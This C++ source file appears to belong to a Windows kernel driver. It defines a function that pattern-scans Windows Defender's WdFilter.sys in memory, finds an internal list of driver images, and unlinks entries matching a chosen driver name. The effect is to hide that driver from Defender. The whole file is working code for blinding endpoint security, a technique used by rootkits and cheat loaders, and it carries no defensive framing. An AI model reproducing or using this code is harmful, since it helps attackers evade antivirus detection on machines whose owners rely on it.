#include "defender.h"

bool defender::CleanFilterList(string driverName)
{
	PVOID wdfilterBase = Memory::GetKernelAddress((PCHAR)"WdFilter.sys");
	if (!wdfilterBase) {
		DbgMsg("[DEFENDER] Failed finding wdfilter!");
		return false;
	}
	ULONG64 gTableOffset = (ULONG64)Memory::FindPatternImage(wdfilterBase, (PCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", (PCHAR)"xxx????xx");
	if (!gTableOffset) {
		DbgMsg("[DEFENDER] Failed finding gTable offset!");
		return false;
	}
	ULONG64 gTable = gTableOffset + 7 + *(PINT)(gTableOffset + 3);
	LIST_ENTRY* gTableHead = (LIST_ENTRY*)(gTable - 0x8);

	for (LIST_ENTRY* entry = gTableHead->Flink;
		entry != gTableHead;
		entry = entry->Flink) {
		UNICODE_STRING* pImageName = (UNICODE_STRING*)((ULONG64)entry + 0x10);

		string imageName(pImageName);
		if (wcsstr(imageName.w_str(), driverName.w_str())) {
			DbgMsg("[DEFENDER] Found entry %wZ, unlinking...", *pImageName);

			LIST_ENTRY* pNext = entry->Flink;
			LIST_ENTRY* pPrev = entry->Blink;

			entry->Blink->Flink = pNext;
			entry->Flink->Blink = pPrev;
		}
	}

	DbgMsg("[DEFENDER] Finished iterating wdfilter list for %ws", driverName.w_str());
	return true;
}
